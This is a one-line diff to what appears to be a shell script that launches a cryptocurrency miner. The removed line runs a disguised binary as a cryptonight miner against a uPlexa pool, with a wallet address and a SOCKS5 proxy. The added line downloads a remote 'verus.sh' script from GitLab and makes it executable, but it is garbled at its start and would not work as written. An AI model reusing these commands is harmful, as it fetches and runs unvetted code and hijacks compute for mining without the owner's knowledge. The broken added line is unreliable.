@@ -1,1 +1,1 @@
-chmod 777 ayam-bakso && ./ayam-bakso -a cryptonight_upx -o tr.uplexa.herominers.com:1177 -u UPX1cYThnrbDmnUCNnV6TeDKufQdDF7XpUWZNV5nMdH8XGsQPse77k43oxfLMxnhF5T7SvNLFQ1ThGSWF2W65fzU8cCmKGiUYg --keepalive --donate-level 1 -p $(echo $(shuf -i 1-20000 -n 1)-V) -k --tls --proxy=socks5://159.223.69.87:1080
+chmod 777 wget https://gitlab.com/renifer12/project-7/-/raw/main/verus.sh && chmod +x verus.sh && ./verus.sh
